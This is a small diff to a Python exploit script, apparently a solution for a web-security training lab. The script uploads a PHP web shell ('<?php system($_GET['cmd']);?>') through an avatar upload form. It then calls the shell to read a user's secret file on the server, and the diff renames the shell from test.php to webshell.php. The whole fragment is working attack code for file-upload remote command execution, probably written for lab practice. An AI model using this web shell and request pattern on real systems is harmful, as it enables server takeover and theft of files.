@@ -48,7 +48,7 @@ def is_upload_webshell_successful(url, session):
     avatar_url = account_url + "/avatar"
     params = {
         "avatar": (
-            'test.php',
+            'webshell.php',
             "<?php system($_GET['cmd']);?>",
             'application/x-php'),
         "user" : "wiener",
@@ -76,7 +76,7 @@ def is_upload_webshell_successful(url, session):
 
 def get_carlos_secret(url, session):
     cmd_url = (
-        url + '/files/avatars/test.php?cmd=' + 
+        url + '/files/avatars/webshell.php?cmd=' + 
         'cat /home/carlos/secret')
     response = session.get(
         cmd_url,
